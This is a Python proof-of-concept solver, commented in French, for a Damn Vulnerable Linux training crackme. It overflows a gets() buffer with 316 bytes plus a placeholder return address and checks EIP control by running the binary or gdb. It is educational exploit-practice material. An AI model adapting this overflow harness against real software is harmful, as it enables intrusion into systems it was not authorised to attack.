#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Solveur / PoC — cesd_dvl_assessment_5 (zero, « 01_exploitme05 »).

Assessment 05 de la certification CESD (Damn Vulnerable Linux). La fonction
exploit_me() :
  - affiche "Return address must be %p" avec &buf (aide pour le shellcode) ;
  - fait gets(buf) avec buf = [ebp-0x138] -> AUCUN controle de longueur.

buf a ebp-0x138, adresse de retour sauvegardee a ebp+4 :
    distance buf -> ret = 0x138 + 4 = 0x13c = 316 octets.
L'entree vient de STDIN (gets). Payload : "A"*316 + EIP(4).

Usage :
  ./crackmes-de-cesd_dvl_assessment_5-solve.py
  ./crackmes-de-cesd_dvl_assessment_5-solve.py --run BIN
  ./crackmes-de-cesd_dvl_assessment_5-solve.py --gdb BIN
"""
import sys, subprocess, struct, os, tempfile, zipfile

OFFSET = 0x138 + 4                 # = 316
NEW_EIP = 0x42424242               # "BBBB"


def payload(eip=NEW_EIP):
    return b"A" * OFFSET + struct.pack("<I", eip) + b"\n"


def extract_elf():
    here = os.path.dirname(os.path.abspath(__file__))
    od = os.path.join(here, "..", "original")
    zpath = os.path.join(od, [f for f in os.listdir(od) if f.endswith(".zip")][0])
    tmp = tempfile.mkdtemp(prefix="cesd05_")
    with zipfile.ZipFile(zpath) as z:
        z.extract("01_exploitme05", tmp)
    p = os.path.join(tmp, "01_exploitme05")
    os.chmod(p, 0o755)
    return p


def main():
    args = sys.argv[1:]
    if not args:
        p = payload()
        print("vuln              : gets(buf), buf=[ebp-0x138]")
        print("offset EIP        : %d" % OFFSET)
        print("EIP cible         : 0x%08x" % NEW_EIP)
        print("payload (len=%d) : %r...%r" % (len(p), p[:16], p[-5:]))
        return
    if args[0] == "--run":
        binp = args[1] if len(args) > 1 else extract_elf()
        r = subprocess.run([binp], input=payload())
        rc = r.returncode
        print("return code = %d (SIGSEGV attendu)" % rc)
        sys.exit(0 if rc in (139, -11) else 1)
    if args[0] == "--gdb":
        binp = args[1] if len(args) > 1 else extract_elf()
        with tempfile.NamedTemporaryFile("wb", suffix=".bin", delete=False) as f:
            f.write(payload())
            inp = f.name
        script = "set pagination off\nrun < %s\ninfo registers eip\nquit\n" % inp
        with tempfile.NamedTemporaryFile("w", suffix=".gdb", delete=False) as f:
            f.write(script)
            gs = f.name
        out = subprocess.run(["gdb", "-q", "-batch", "-x", gs, binp],
                             capture_output=True, text=True)
        print(out.stdout)
        ok = "0x42424242" in out.stdout
        print("EIP controle :", "OUI" if ok else "non")
        sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
